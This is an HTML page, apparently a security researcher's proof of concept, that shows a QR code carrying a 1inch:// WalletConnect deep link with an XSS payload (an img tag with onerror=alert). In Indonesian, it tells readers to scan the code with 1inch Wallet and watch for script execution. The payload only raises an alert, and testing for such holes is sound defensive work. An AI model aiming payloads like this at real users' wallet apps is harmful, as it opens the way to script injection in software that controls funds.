<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Test - WalletConnect</title>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    <style>
        body { font-family: Arial; background:#000; color:#0f0; padding:20px; text-align:center; }
    </style>
</head>
<body>
    <h1>XSS / Injection Test for WalletConnect</h1>

    <div id="qrcode"></div>
    <p><strong>Scan QR ini di WalletConnect</strong></p>

    <script>
        const payload = `1inch://connect?data=<img src=x onerror=alert('XSS in 1inch WalletConnect')>`;

        new QRCode(document.getElementById("qrcode"), {
            text: payload,
            width: 300,
            height: 300,
            colorDark : "#ffffff",
            colorLight : "#000000"
        });

        // Test reflected XSS di halaman ini
        console.log("%cXSS Test Payload Ready", "color:red; font-size:18px");
    </script>

    <p>Coba scan QR Code di atas menggunakan 1inch Wallet atau aplikasi WalletConnect lain.</p>
    <p>Perhatikan apakah ada alert atau eksekusi script.</p>
</body>
</html>
